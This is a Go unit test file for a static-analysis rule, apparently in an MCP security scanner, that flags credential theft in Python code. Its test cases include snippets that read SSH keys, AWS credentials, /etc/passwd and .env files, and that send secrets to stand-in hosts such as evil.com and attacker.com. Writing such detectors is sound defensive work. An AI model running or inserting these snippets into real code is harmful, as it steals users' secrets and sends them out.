package rules

import (
	"testing"

	"github.com/FlppFer/MCPGuard/internal/service/static_analysis"
	"github.com/FlppFer/MCPGuard/internal/service/static_analysis/languages/python"
)

func TestCredentialTheftRule_ID(t *testing.T) {
	rule := NewCredentialTheftRule()
	expected := "MCP-DTI-003"
	if rule.ID() != expected {
		t.Errorf("ID() = %v, want %v", rule.ID(), expected)
	}
}

func TestCredentialTheftRule_Description(t *testing.T) {
	rule := NewCredentialTheftRule()
	if rule.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

func TestCredentialTheftRule_AppliesToLanguage(t *testing.T) {
	rule := NewCredentialTheftRule()
	expected := "python"
	if rule.AppliesToLanguage() != expected {
		t.Errorf("AppliesToLanguage() = %v, want %v", rule.AppliesToLanguage(), expected)
	}
}

func TestCredentialTheftRule_Evaluate(t *testing.T) {
	tests := []struct {
		name         string
		code         string
		wantFindings bool
		minFindings  int
	}{
		{
			name: "reading /etc/passwd",
			code: `
with open("/etc/passwd", "r") as f:
    content = f.read()
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "reading /etc/passwd",
			code: `
passwd = open("/etc/passwd").read()
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "accessing SSH keys",
			code: `
ssh_key = open("~/.ssh/id_rsa").read()
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "accessing AWS credentials",
			code: `
aws_creds = open("~/.aws/credentials").read()
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "environment variable access - API key",
			code: `
import os
api_key = os.environ.get("API_KEY")
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "environment variable access - secret",
			code: `
import os
secret = os.getenv("API_KEY")
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "reading .env file",
			code: `
with open(".env") as f:
    env_vars = f.read()
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "reading mcp.json",
			code: `
import json
with open("mcp.json") as f:
    config = json.load(f)
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "exfiltration via requests",
			code: `
import requests
requests.post("http://evil.com", data={"creds": credentials})
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "exfiltration via urllib",
			code: `
import urllib.request
urllib.request.urlopen("http://attacker.com?data=" + secret)
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "base64 encoding credentials",
			code: `
import base64
encoded = base64.b64encode(password.encode())
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "password variable access",
			code: `
password = "secret_password"
`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name: "clean code - no credential access",
			code: `
def hello():
    return "Hello, World!"
`,
			wantFindings: false,
			minFindings:  0,
		},
		{
			name: "reading normal file",
			code: `
with open("data.txt") as f:
    data = f.read()
`,
			wantFindings: false,
			minFindings:  0,
		},
		{
			name: "accessing netrc",
			code: `
netrc_path = "~/.netrc"
`,
			wantFindings: true,
			minFindings:  1, 
		},
		{
			name: "accessing openai key",
			code: `
key = "openai_api_key: sk-xxx"
`,
			wantFindings: true,
			minFindings:  1,
		},
	}

	rule := NewCredentialTheftRule()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := python.ParsePythonSource("test.py", []byte(tt.code))
			if err != nil {
				t.Fatalf("Failed to parse Python code: %v", err)
			}

			findings, err := rule.Evaluate(ast)
			if err != nil {
				t.Fatalf("Evaluate() error = %v", err)
			}

			if tt.wantFindings {
				if len(findings) < tt.minFindings {
					t.Errorf("Expected at least %d findings, got %d", tt.minFindings, len(findings))
				}
			} else {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			}
		})
	}
}

func TestCredentialTheftRule_EvaluateNonPythonAST(t *testing.T) {
	rule := NewCredentialTheftRule()
	findings, err := rule.Evaluate("not a python ast")
	if err != nil {
		t.Errorf("Evaluate() should not error on non-Python AST, got %v", err)
	}
	if findings != nil {
		t.Errorf("Evaluate() should return nil for non-Python AST, got %v", findings)
	}
}

func TestCredentialTheftRule_Severity(t *testing.T) {
	tests := []struct {
		name             string
		code             string
		expectedSeverity string
	}{
		{
			name:             "SSH key access should be critical",
			code:             `open("~/.ssh/id_rsa")`,
			expectedSeverity: static_analysis.SeverityCritical,
		},
		{
			name:             "etc/passwd should be critical",
			code:             `open("/etc/passwd")`,
			expectedSeverity: static_analysis.SeverityCritical,
		},
	}

	rule := NewCredentialTheftRule()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := python.ParsePythonSource("test.py", []byte(tt.code))
			if err != nil {
				t.Fatalf("Failed to parse: %v", err)
			}

			findings, _ := rule.Evaluate(ast)
			if len(findings) > 0 {
				if findings[0].Severity != tt.expectedSeverity {
					t.Errorf("Expected severity %s, got %s", tt.expectedSeverity, findings[0].Severity)
				}
			}
		})
	}
}
